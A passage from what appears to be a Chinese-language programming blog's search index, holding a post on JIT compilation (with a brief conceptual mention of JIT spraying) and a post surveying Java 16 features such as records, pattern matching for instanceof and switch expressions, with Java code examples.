src="https://cdn.discordapp.com/attachments/756159774231494706/840847434791124992/image0.png" alt="" /></p><p>程式語言效能圖，強者我朋友mes在golang教學中載的圖忘記來源。</p><p>(由於程式碼寫法的問題，不一定所有的 source code 被編譯的時候都會被優化，有的更可能造成執行速度變慢)</p><h3 id="jit的在執行階段的優化"><a class="markdownIt-Anchor" href="#jit的在執行階段的優化"></a> JIT的在執行階段的優化</h3><p>如果有一段組合語言在程式碼當中出現了1000次，直譯器(interpreter) 會重複組譯1000次同樣的機器語言，JIT 會將這段機器語言先保留在快取記憶體內，每當遇到的時後就直接拿這段機器語言來執行，不用再組譯999次。</p><h3 id="jit的編譯情形"><a class="markdownIt-Anchor" href="#jit的編譯情形"></a> JIT的編譯情形</h3><p><img src="https://img-blog.csdnimg.cn/20190211113255885.png" alt="" /></p><p>此外，為了降低 JIT 對編譯造成的負擔，JIT目前僅針對迴圈等會重複出現的程式碼做優化的動作。</p><h3 id="jit的技術支持"><a class="markdownIt-Anchor" href="#jit的技術支持"></a> JIT的技術支持</h3><p>JIT 很大一部分建立於 java 的 garbage collection 之上，若想要更進一步的了解可以參閱<a href="https://www.oracle.com/webfolder/technetwork/tutorials/obe/java/gc01/index.html">官方說明</a>。</p><h3 id="安全問題"><a class="markdownIt-Anchor" href="#安全問題"></a> 安全問題</h3><p>JIT 編譯的實現包括將 source code 或 byte code 編譯為機器代碼並執行。通常這是直接在內存中完成的 -JIT 編譯器將機器代碼直接輸出到內存中並立即執行，而不是將其輸出到硬碟上。</p><p>然後像大部分的預編譯一樣，將程式碼作為單獨的程序調用。在現代體系結構中，由於 Executable space protection (可執行空間)的保護，這會帶來一個問題–無法執行任意記憶體，否則會存在潛在的安全漏洞。</p><p>因此，必須將記憶體先標記為可執行。出於安全原因，應在將代碼寫入內存並標記為只讀之後執行此操作。</p><p>JIT Spraying 是一類計算機安全漏洞利用，它使用 JIT compilation for heap spraying，然後生成的記憶體是可執行的，如果可以將執行轉移到 heap 當中，就可以利用該漏洞。</p><h3 id="afan閒聊"><a class="markdownIt-Anchor" href="#afan閒聊"></a> afan閒聊</h3><p><a href="https://afan0918.github.io/java/java16/">java 16</a> 優化了他的 garbage collection 功能，利用平行處理把垃圾回收機制的運行壓在 1ms (毫秒)之內，又更快了。</p><p>話說在去年底，PHP 8.0 也引入了 JIT，雖然PHP是世界上最好的語言梗一直被玩，但好像真的有在不斷改進與進化。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java16的新特性</title>
      <link href="/java-16/"/>
      <url>/java-16/</url>
      
        <content type="html"><![CDATA[<p>雖然好像慢了，但還是小小來記錄一下java 16到底有什麼具體的改變，方便我跟版本，畢竟9月就要發布java 17(LTS,長期穩定支援版本)了，總不能一直抱著祖傳java 8。</p><p>我就挑我覺得比較酷的來說，因為網路上的內容基本上都講得滿模糊的，所以乾脆直接看oracle的java document，再加入我自己的一點理解。</p><h2 id="record-classes"><a class="markdownIt-Anchor" href="#record-classes"></a> Record Classes</h2><p>Record Classes的官方預設用途是被拿來實作簡單的&quot;數據載體&quot;的，基本上就是一個我覺得還算好用的語法糖。</p><span id="more"></span><p>具體功能大概是這樣。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">record</span> <span class="title class_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123; &#125;</span><br></pre></td></tr></table></figure><p>開發者寫的這一段code等效於以下的程式碼。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">double</span> length;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">double</span> width;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.length = length;</span><br><span class="line">        <span class="built_in">this</span>.width = width;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> <span class="title function_">length</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.length; &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">width</span><span class="params">()</span>  &#123; <span class="keyword">return</span> <span class="built_in">this</span>.width; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Implementation of equals() and hashCode(), which specify</span></span><br><span class="line">    <span class="comment">// that two record objects are equal if they</span></span><br><span class="line">    <span class="comment">// are of the same type and contain equal field values.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> equals...</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> hashCode...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An implementation of toString() that returns a string</span></span><br><span class="line">    <span class="comment">// representation of all the record class&#x27;s fields,</span></span><br><span class="line">    <span class="comment">// including their names.</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以從上面看到輸入的數據會被<strong>寫死在class創建的時候</strong>，並且自動生成equals，hashCode和toString function，我覺得不算驚艷，但還不錯，可以快速的來處理簡單得數據資料。</p><p>來講一下equals()跟hashCode()的用途，在java當中，==運算子比較的是物件實體或者說是記憶體位置是否相同，而equals()可以比較物件的值是否相同。</p><p>hashCode()則是會回傳一個將過hash函數處裡的int值，可以被用來做HashMap、HashSet等雜湊資料結構的索引，讓使用者可以以hashCode()快速實現相關結構。</p><p>另外不能宣告instance variables(non-static fields)或者是instance initializers。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">record</span> <span class="title class_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Field declarations must be static:</span></span><br><span class="line">    BiFunction&lt;Double, Double, Double&gt; diagonal;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Instance initializers are not allowed in records:</span></span><br><span class="line">    &#123;</span><br><span class="line">        diagonal = (x, y) -&gt; Math.sqrt(x*x + y*y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>類似這樣的code將不會被編譯。</p><p>但可以在Record Classes當中聲明instance methods，像是以下程式碼。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">record</span> <span class="title class_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Nested record class</span></span><br><span class="line">    <span class="keyword">record</span> <span class="title class_">RotationAngle</span><span class="params">(<span class="type">double</span> angle)</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> RotationAngle &#123;</span><br><span class="line">            angle = Math.toRadians(angle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Public instance method</span></span><br><span class="line">    <span class="keyword">public</span> Rectangle <span class="title function_">getRotatedRectangleBoundingBox</span><span class="params">(<span class="type">double</span> angle)</span> &#123;</span><br><span class="line">        <span class="type">RotationAngle</span> <span class="variable">ra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RotationAngle</span>(angle);</span><br><span class="line">        <span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> Math.abs(length * Math.cos(ra.angle())) +</span><br><span class="line">                   Math.abs(width * Math.sin(ra.angle()));</span><br><span class="line">        <span class="type">double</span> <span class="variable">y</span> <span class="operator">=</span> Math.abs(length * Math.sin(ra.angle())) +</span><br><span class="line">                   Math.abs(width * Math.cos(ra.angle()));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>(x, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pattern-matching-for-instanceof"><a class="markdownIt-Anchor" href="#pattern-matching-for-instanceof"></a> Pattern Matching for instanceof</h2><p>instanceof是java當中的保留關鍵字，用於確認變數型態，當相同時就返回true，不同就返回false。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Double</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(d <span class="keyword">instanceof</span> Double)&#123;<span class="comment">//true</span></span><br><span class="line">    <span class="comment">//做某件事情</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(d <span class="keyword">instanceof</span> Boolean)&#123;<span class="comment">//false</span></span><br><span class="line">    <span class="comment">//做某件事情</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就會像是這個樣子，可以降低程式的bug還有一些implements的子class分類會很好弄，像是以下這樣。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">getPerimeter</span><span class="params">(Shape shape)</span> <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        <span class="keyword">if</span> (shape <span class="keyword">instanceof</span> Rectangle) &#123;</span><br><span class="line">            <span class="type">Rectangle</span> <span class="variable">r</span> <span class="operator">=</span> (Rectangle) shape;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * r.length() + <span class="number">2</span> * r.width();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shape <span class="keyword">instanceof</span> Circle) &#123;</span><br><span class="line">            <span class="type">Circle</span> <span class="variable">c</span> <span class="operator">=</span> (Circle) shape;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * c.radius() * Math.PI;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unrecognized shape&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> length;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> width;    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.length = length;</span><br><span class="line">        <span class="built_in">this</span>.width = width;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="type">double</span> <span class="title function_">length</span><span class="params">()</span> &#123; <span class="keyword">return</span> length; &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">width</span><span class="params">()</span> &#123; <span class="keyword">return</span> width; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">double</span> radius;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Circle</span><span class="params">(<span class="type">double</span> radius)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.radius = radius;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="type">double</span> <span class="title function_">radius</span><span class="params">()</span> &#123; <span class="keyword">return</span> radius; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在java 16當中，有新的語法糖來簡化這個過程。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">getPerimeter</span><span class="params">(Shape shape)</span><span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">    <span class="keyword">if</span> (shape <span class="keyword">instanceof</span> Rectangle r) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * r.length() + <span class="number">2</span> * r.width();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shape <span class="keyword">instanceof</span> Circle c) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * c.radius() * Math.PI;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentExceptio</span>(<span class="string">&quot;Unrecognized shape&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就是可以宣告一個變數並等同於shape以便後續使用。</p><h2 id="switch-expressions"><a class="markdownIt-Anchor" href="#switch-expressions"></a> Switch Expressions</h2><p>Switch Expressions應該是我最喜歡的部分，他把switch弄得酷酷的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Day</span> &#123; SUNDAY, MONDAY, TUESDAY,</span><br><span class="line">    WEDNESDAY, THURSDAY, FRIDAY, SATURDAY; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">numLetters</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">Day</span> <span class="variable">day</span> <span class="operator">=</span> Day.WEDNESDAY;</span><br><span class="line">    <span class="keyword">switch</span> (day) &#123;</span><br><span class="line">        <span class="keyword">case</span> MONDAY:</span><br><span class="line">        <span class="keyword">case</span> FRIDAY:</span><br><span class="line">        <span class="keyword">case</span> SUNDAY:</span><br><span class="line">            numLetters = <span class="number">6</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TUESDAY:</span><br><span class="line">            numLetters = <span class="number">7</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> THURSDAY:</span><br><span class="line">        <span class="keyword">case</span> SATURDAY:</span><br><span class="line">            numLetters = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WEDNESDAY:</span><br><span class="line">            numLetters = <span class="number">9</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid day: &quot;</span> + day);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(numLetters);</span><br></pre></td></tr></table></figure><p>在java 16中把這種又長又冗的寫法改為以下這種，有夠香的啦!我前陣子寫計算機概論的作業的時候用的滿開心的。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Day</span> <span class="variable">day</span> <span class="operator">=</span> Day.WEDNESDAY;    </span><br><span class="line">System.out.println(</span><br><span class="line">    <span class="keyword">switch</span> (day) &#123;</span><br><span class="line">        <span class="keyword">case</span> MONDAY, FRIDAY, SUNDAY -&gt; <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">case</span> TUESDAY                -&gt; <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">case</span> THURSDAY, SATURDAY     -&gt; <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">case</span> WEDNESDAY              -&gt; <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">default</span> -&gt; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid day: &quot;</span> + day);</span><br><span class="line">    &#125;</span><br><span class="line">);    </span><br></pre></td></tr></table></figure><p>而如果要寫更多(不只一行)操作的話，可以用{}把內容括號起來執行，例如以下。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">numLetters</span> <span class="operator">=</span> <span class="keyword">switch</span> (day) &#123;</span><br><span class="line">    <span class="keyword">case</span> MONDAY, FRIDAY, SUNDAY -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="number">6</span>);</span><br><span class="line">        yield <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TUESDAY -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="number">7</span>);</span><br><span class="line">        yield <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> THURSDAY, SATURDAY -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="number">8</span>);</span><br><span class="line">        yield <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> WEDNESDAY -&gt; &#123;</span><br><span class="line">        System.out.println(<span class="number">9</span>);</span><br><span class="line">        yield <span class="number">9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span> -&gt; &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid day: &quot;</span> + day);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><h2 id="封裝與其他部分"><a class="markdownIt-Anchor" href="#封裝與其他部分"></a> 封裝與其他部分</h2><p>因為涉及到程式編寫層面較少，所以我把我覺得比較重要的改變拉出來集合成一個分類。</p><h3 id="完整功能"><a class="markdownIt-Anchor" href="#完整功能"></a> 完整功能</h3><ul><li><p>java 16封裝了除了關鍵的內部API以外的所有內部方法，JDK默認為拒絕所有的非必要訪問，除非使用–add-opens打開特定套件。</p></li><li><p>優化ZGC(java內部提供的垃圾記憶體回收機制)，以多執行續處理，極大的降低延遲。</p></li><li><p>可以將未使用的HotSpot VM metaspace 記憶體更快速的回傳給操作系統。</p></li></ul><h3 id="正在開發的項目和preview功能"><a class="markdownIt-Anchor" href="#正在開發的項目和preview功能"></a> 正在開發的項目和preview功能</h3><ul><li><p>Vector API : 在CPU架構上對向量運算做出優化，提供更高的性能。</p></li><li><p>Foreign Linker API : 把原本用來呼叫其他程式語言的JNI取代掉，該API提供靜態類型的純Java訪問，感覺比應該不會比JNI難用(?)，我快受夠JNI了。</p></li><li><p>Sealed Classes : 可以限制那些class or interfaces可以extend or implement Sealed Classes和可以限制use of a superclass，目前還在預覽階段，但感覺是想未來逐漸取代掉class。</p></li></ul><h3 id="jdk內部改變"><a class="markdownIt-Anchor" href="#jdk內部改變"></a> JDK內部改變</h3><ul><li>JDK 原程式碼開始使用C++ 14</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
